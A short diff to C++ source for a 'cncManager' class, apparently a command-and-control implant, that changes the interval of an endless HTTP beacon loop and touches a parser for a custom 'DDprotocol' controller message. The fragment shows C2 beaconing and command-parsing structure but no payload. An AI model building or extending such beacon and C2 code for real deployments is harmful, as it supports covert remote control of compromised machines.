@@ -1,4 +1,5 @@
 #include <iostream>
+#include <string>
 #include "cncManager.h"
 
 cncManager::cncManager() {
@@ -92,7 +93,7 @@ void cncManager::sendBeacon() {
 
 	while (TRUE) {
 		this->sendHttpRequest((LPVOID)beaconFrame, sizeof(DDprotocol));
-		Sleep(500);
+		Sleep(1000);
 	}
 }
 
@@ -114,6 +115,7 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
 
         if (resData->header != DDPROTO_HEADER)
             std::cout << "Invalid Header !!!" << std::endl;
+        
 
         else {
             switch (resData->type)
